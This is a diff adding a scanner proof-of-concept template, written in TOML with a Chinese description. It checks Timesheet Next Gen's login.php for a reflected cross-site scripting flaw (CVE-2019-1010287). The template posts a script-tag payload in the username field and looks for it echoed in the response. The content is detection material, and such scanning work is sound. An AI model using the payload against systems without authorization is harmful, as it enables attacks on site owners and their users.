@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "通过向 /timesheet/login.php 发送 POST 请求，在 username 参数中注入 XSS 载荷，检测响应中是否回显注入的脚本代码，验证反射型 XSS 漏洞是否存在"
+id = "POC-AVE-2019-0031"
+name = "Timesheet Next Gen 跨站脚本漏洞 PoC"
+severity = "medium"
+tags = ["ave-2019-0031"]
+vuln_id = [
+    "CVE-2019-1010287",
+    "AVE-2019-0031",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/timesheet/login.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscript%3E&password=pd&submit=Login"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["'><script>javascript:alert(document.domain)</script>"]
